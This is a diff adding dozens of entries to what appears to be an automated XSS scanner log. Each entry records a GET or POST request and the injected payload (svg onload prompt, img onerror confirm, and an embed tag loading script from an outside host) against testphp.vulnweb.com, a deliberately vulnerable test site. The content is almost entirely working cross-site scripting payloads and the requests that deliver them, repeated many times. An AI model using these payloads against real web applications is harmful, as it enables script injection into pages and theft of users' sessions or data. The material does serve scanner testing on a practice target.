@@ -77,3 +77,167 @@ Method: GET
 URL: http://testphp.vulnweb.com/showimage.php?file=%3Csvg%20%3C/onload%20=%221%3E%20(_=prompt,_(1))%20%22%22%3E%22
 Payload: <svg </onload ="1> (_=prompt,_(1)) "">"
 
+---------------[Xss found!]-----------------
+Method: POST
+URL: http://testphp.vulnweb.com/search.php?test=query
+Payload: <svg </onload ="1> (_=prompt,_(1)) "">"
+Keys: {'searchFor': '<svg </onload ="1> (_=prompt,_(1)) "">"', 'goButton': 'goButton'}
+
+---------------[Xss found!]-----------------
+Method: POST
+URL: http://testphp.vulnweb.com/search.php?test=query
+Payload: <--`<img/src=` onerror=confirm``> --!>
+Keys: {'searchFor': '<--`<img/src=` onerror=confirm``> --!>', 'goButton': 'goButton'}
+
+---------------[Xss found!]-----------------
+Method: POST
+URL: http://testphp.vulnweb.com/search.php?test=query
+Payload: <--`<img/src=` onerror=confirm``> --!>
+Keys: {'searchFor': '<--`<img/src=` onerror=confirm``> --!>', 'goButton': 'goButton'}
+
+---------------[Xss found!]-----------------
+Method: GET
+URL: http://testphp.vulnweb.com/listproducts.php?cat=%3C--%60%3Cimg/src=%60%20onerror=confirm%60%60%3E%20--!%3E
+Payload: <--`<img/src=` onerror=confirm``> --!>
+
+---------------[Xss found!]-----------------
+Method: GET
+URL: http://testphp.vulnweb.com/listproducts.php?cat=%3C--%60%3Cimg/src=%60%20onerror=confirm%60%60%3E%20--!%3E
+Payload: <--`<img/src=` onerror=confirm``> --!>
+
+---------------[Xss found!]-----------------
+Method: GET
+URL: http://testphp.vulnweb.com/listproducts.php?cat=%3C--%60%3Cimg/src=%60%20onerror=confirm%60%60%3E%20--!%3E
+Payload: <--`<img/src=` onerror=confirm``> --!>
+
+---------------[Xss found!]-----------------
+Method: POST
+URL: http://testphp.vulnweb.com/search.php?test=query
+Payload: <embed src=//14.rs>
+Keys: {'searchFor': '<embed src=//14.rs>', 'goButton': 'goButton'}
+
+---------------[Xss found!]-----------------
+Method: POST
+URL: http://testphp.vulnweb.com/search.php?test=query
+Payload: <svg </onload ="1> (_=prompt,_(1)) "">"
+Keys: {'searchFor': '<svg </onload ="1> (_=prompt,_(1)) "">"', 'goButton': 'goButton'}
+
+---------------[Xss found!]-----------------
+Method: POST
+URL: http://testphp.vulnweb.com/search.php?test=query
+Payload: <svg </onload ="1> (_=prompt,_(1)) "">"
+Keys: {'searchFor': '<svg </onload ="1> (_=prompt,_(1)) "">"', 'goButton': 'goButton'}
+
+---------------[Xss found!]-----------------
+Method: GET
+URL: http://testphp.vulnweb.com/listproducts.php?cat=%3Csvg%20%3C/onload%20=%221%3E%20(_=prompt,_(1))%20%22%22%3E%22
+Payload: <svg </onload ="1> (_=prompt,_(1)) "">"
+
+---------------[Xss found!]-----------------
+Method: GET
+URL: http://testphp.vulnweb.com/listproducts.php?cat=%3Csvg%20%3C/onload%20=%221%3E%20(_=prompt,_(1))%20%22%22%3E%22
+Payload: <svg </onload ="1> (_=prompt,_(1)) "">"
+
+---------------[Xss found!]-----------------
+Method: GET
+URL: http://testphp.vulnweb.com/listproducts.php?cat=%3Csvg%20%3C/onload%20=%221%3E%20(_=prompt,_(1))%20%22%22%3E%22
+Payload: <svg </onload ="1> (_=prompt,_(1)) "">"
+
+---------------[Xss found!]-----------------
+Method: GET
+URL: http://testphp.vulnweb.com/listproducts.php?cat=%3Csvg%20%3C/onload%20=%221%3E%20(_=prompt,_(1))%20%22%22%3E%22
+Payload: <svg </onload ="1> (_=prompt,_(1)) "">"
+
+---------------[Xss found!]-----------------
+Method: POST
+URL: http://testphp.vulnweb.com/search.php?test=query
+Payload: <svg </onload ="1> (_=prompt,_(1)) "">"
+Keys: {'searchFor': '<svg </onload ="1> (_=prompt,_(1)) "">"', 'goButton': 'goButton'}
+
+---------------[Xss found!]-----------------
+Method: GET
+URL: http://testphp.vulnweb.com/showimage.php?file=%3Csvg%20%3C/onload%20=%221%3E%20(_=prompt,_(1))%20%22%22%3E%22
+Payload: <svg </onload ="1> (_=prompt,_(1)) "">"
+
+---------------[Xss found!]-----------------
+Method: GET
+URL: http://testphp.vulnweb.com/listproducts.php?cat=%3Csvg%20%3C/onload%20=%221%3E%20(_=prompt,_(1))%20%22%22%3E%22
+Payload: <svg </onload ="1> (_=prompt,_(1)) "">"
+
+---------------[Xss found!]-----------------
+Method: GET
+URL: http://testphp.vulnweb.com/showimage.php?file=%3Csvg%20%3C/onload%20=%221%3E%20(_=prompt,_(1))%20%22%22%3E%22
+Payload: <svg </onload ="1> (_=prompt,_(1)) "">"
+
+---------------[Xss found!]-----------------
+Method: GET
+URL: http://testphp.vulnweb.com/listproducts.php?cat=%3Csvg%20%3C/onload%20=%221%3E%20(_=prompt,_(1))%20%22%22%3E%22
+Payload: <svg </onload ="1> (_=prompt,_(1)) "">"
+
+---------------[Xss found!]-----------------
+Method: GET
+URL: http://testphp.vulnweb.com/showimage.php?file=%3Csvg%20%3C/onload%20=%221%3E%20(_=prompt,_(1))%20%22%22%3E%22
+Payload: <svg </onload ="1> (_=prompt,_(1)) "">"
+
+---------------[Xss found!]-----------------
+Method: GET
+URL: http://testphp.vulnweb.com/listproducts.php?cat=%3Csvg%20%3C/onload%20=%221%3E%20(_=prompt,_(1))%20%22%22%3E%22
+Payload: <svg </onload ="1> (_=prompt,_(1)) "">"
+
+---------------[Xss found!]-----------------
+Method: GET
+URL: http://testphp.vulnweb.com/showimage.php?file=%3Csvg%20%3C/onload%20=%221%3E%20(_=prompt,_(1))%20%22%22%3E%22
+Payload: <svg </onload ="1> (_=prompt,_(1)) "">"
+
+---------------[Xss found!]-----------------
+Method: GET
+URL: http://testphp.vulnweb.com/listproducts.php?cat=%3Csvg%20%3C/onload%20=%221%3E%20(_=prompt,_(1))%20%22%22%3E%22
+Payload: <svg </onload ="1> (_=prompt,_(1)) "">"
+
+---------------[Xss found!]-----------------
+Method: GET
+URL: http://testphp.vulnweb.com/showimage.php?file=%3Csvg%20%3C/onload%20=%221%3E%20(_=prompt,_(1))%20%22%22%3E%22
+Payload: <svg </onload ="1> (_=prompt,_(1)) "">"
+
+---------------[Xss found!]-----------------
+Method: GET
+URL: http://testphp.vulnweb.com/listproducts.php?cat=%3Csvg%20%3C/onload%20=%221%3E%20(_=prompt,_(1))%20%22%22%3E%22
+Payload: <svg </onload ="1> (_=prompt,_(1)) "">"
+
+---------------[Xss found!]-----------------
+Method: GET
+URL: http://testphp.vulnweb.com/showimage.php?file=%3Csvg%20%3C/onload%20=%221%3E%20(_=prompt,_(1))%20%22%22%3E%22
+Payload: <svg </onload ="1> (_=prompt,_(1)) "">"
+
+---------------[Xss found!]-----------------
+Method: GET
+URL: http://testphp.vulnweb.com/listproducts.php?cat=%3Csvg%20%3C/onload%20=%221%3E%20(_=prompt,_(1))%20%22%22%3E%22
+Payload: <svg </onload ="1> (_=prompt,_(1)) "">"
+
+---------------[Xss found!]-----------------
+Method: POST
+URL: http://testphp.vulnweb.com/search.php?test=query
+Payload: <svg </onload ="1> (_=prompt,_(1)) "">"
+Keys: {'searchFor': '<svg </onload ="1> (_=prompt,_(1)) "">"', 'goButton': 'goButton'}
+
+---------------[Xss found!]-----------------
+Method: GET
+URL: http://testphp.vulnweb.com/showimage.php?file=%3Csvg%20%3C/onload%20=%221%3E%20(_=prompt,_(1))%20%22%22%3E%22
+Payload: <svg </onload ="1> (_=prompt,_(1)) "">"
+
+---------------[Xss found!]-----------------
+Method: POST
+URL: http://testphp.vulnweb.com/search.php?test=query
+Payload: <svg </onload ="1> (_=prompt,_(1)) "">"
+Keys: {'searchFor': '<svg </onload ="1> (_=prompt,_(1)) "">"', 'goButton': 'goButton'}
+
+---------------[Xss found!]-----------------
+Method: GET
+URL: http://testphp.vulnweb.com/showimage.php?file=%3Csvg%20%3C/onload%20=%221%3E%20(_=prompt,_(1))%20%22%22%3E%22
+Payload: <svg </onload ="1> (_=prompt,_(1)) "">"
+
+---------------[Xss found!]-----------------
+Method: GET
+URL: http://testphp.vulnweb.com/listproducts.php?cat=%3Csvg%20%3C/onload%20=%221%3E%20(_=prompt,_(1))%20%22%22%3E%22
+Payload: <svg </onload ="1> (_=prompt,_(1)) "">"
+
